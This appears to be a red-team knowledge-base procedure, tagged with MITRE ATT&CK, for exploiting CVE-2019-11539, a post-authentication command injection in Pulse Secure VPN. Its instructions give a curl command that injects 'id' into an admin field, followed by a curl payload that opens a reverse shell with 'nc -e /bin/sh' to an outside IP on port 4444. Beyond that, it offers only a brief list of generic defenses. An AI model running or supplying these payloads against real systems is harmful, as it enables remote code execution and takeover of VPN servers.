---
id: proc-uuid-7
tags:
  - rce
  - command-injection
  - cve-2019-11539
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:31:52.983Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Achieve RCE via Post-Auth Command Injection in Pulse Secure VPN

## Summary

Exploit CVE-2019-11539 for OS command injection in the post-auth admin interface, achieving remote code execution on the VPN server.

## Description

With admin credentials, inject commands into unsanitized inputs in admin functions, leading to shell execution, file writes, and intranet access.

## Requirements

1. Admin access from previous steps
2. Knowledge of injection points in admin UI

## Defense

Defensive measures and detection strategies:

- Sanitize all admin inputs
- Run VPN in least-privilege context
- Monitor for command execution logs

## Objectives

1. Execute arbitrary commands
2. Gain shell access
3. Enable lateral movement

## Instructions

### Step 1: Identify Injection Point

**Context**: Test admin forms for injection.

Navigate to vulnerable function and inject:

```bash
# Example injection in file upload or config field
curl -d "command=; id;" https://vpn.example.com/proxy/https/0/admin/config
```

> Returns output like uid=0(root).

### Step 2: Execute Payload

**Context**: Chain to full RCE.

Inject for shell:

```bash
# PoC: nc -e /bin/sh attacker_ip 4444
curl -d "payload=; nc -e /bin/sh 1.2.3.4 4444;" https://vpn.example.com/proxy/https/0/admin/exec
```

> Establishes reverse shell.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- rce
- command-injection
- cve-2019-11539
